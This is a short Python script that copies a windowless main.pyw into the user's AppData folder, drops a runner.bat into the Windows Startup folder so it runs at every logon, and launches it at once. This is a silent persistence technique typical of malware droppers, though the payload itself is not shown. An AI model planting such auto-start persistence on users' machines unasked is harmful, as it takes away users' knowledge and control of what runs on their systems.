import os
from shutil import copyfile
copyfile(
    "main.pyw",
    f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\main.pyw"
)
with open(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runner.bat", "w") as runner:
    runner.write(f"start C:\\Users\\{os.getlogin()}\\AppData\\Local\\main.pyw")
os.startfile(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\main.pyw")
# copyfile(
#     "runner.bat",
#     f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runner.bat"
# )
